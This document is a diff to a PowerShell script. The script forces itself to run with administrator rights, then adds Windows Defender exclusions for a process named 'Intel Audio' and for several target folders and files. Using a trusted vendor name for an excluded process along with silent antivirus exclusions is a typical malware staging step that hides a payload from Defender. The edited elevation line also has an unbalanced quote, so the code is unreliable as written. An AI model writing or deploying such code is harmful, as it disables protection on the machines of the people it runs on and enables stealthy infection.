@@ -1,10 +1,9 @@
-# Self-elevate the script if required
 if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
-	if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
-				$CommandLine = "-NoExit -c cd '$pwd'; & `"" + $MyInvocation.MyCommand.Path + "`""
-				Start-Process powershell -Verb runas -ArgumentList $CommandLine
-				Exit
-	}
+      if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
+            $CommandLine = "" + $MyInvocation.MyCommand.Path + "`""
+            Start-Process powershell -Verb runas -ArgumentList $CommandLine
+            Exit
+      }
 }
 
 #Elevated script content after that
@@ -41,9 +40,9 @@ if (-Not (Test-Path "$TargetPath")) {
       Write-Output "Target folder created"
 }
 
-Set-MpPreference -ExclusionProcess 'Intel Audio'
-Set-MpPreference -ExclusionProcess 'Intel Audioexe'
-Set-MpPreference -ExclusionPath "$FolderPath"
+Add-MpPreference -ExclusionProcess 'Intel Audio'
+Add-MpPreference -ExclusionProcess 'Intel Audio.exe'
+Add-MpPreference -ExclusionPath "$FolderPath"
 Add-MpPreference -ExclusionPath "$TargetPath"
 Add-MpPreference -ExclusionPath "$TargetFile"
 Write-Output "Exclusions added"
